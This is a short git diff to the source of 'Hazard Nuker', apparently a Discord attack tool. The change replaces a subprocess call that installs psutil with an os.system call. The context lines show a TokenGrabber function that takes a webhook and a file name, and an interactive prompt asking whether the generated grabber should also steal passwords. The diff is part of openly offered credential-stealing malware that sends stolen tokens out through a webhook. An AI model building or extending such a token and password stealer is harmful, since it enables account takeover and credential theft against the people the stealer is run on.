@@ -2,9 +2,7 @@
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
 import os
-import subprocess
 import shutil
-import sys
 import Hazard
 # import PyInstaller.__main__
 
@@ -20,7 +18,7 @@ def TokenGrabber(WebHook, fileName):
         print(f'\n{Fore.GREEN}Psutil already installed, proceeding. . .{Fore.RESET}')
     except ModuleNotFoundError:
         print(f'\n{Fore.YELLOW}Psutil not found | Installing it for you{Fore.RESET}\n')
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', "psutil"], stdout=subprocess.DEVNULL)
+        os.system("pip install psutil")
     choice = str(input(
         f'\n{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Do you want it to steal password? (Y to enable): {Fore.LIGHTRED_EX}'))
     if choice.upper() == 'Y':
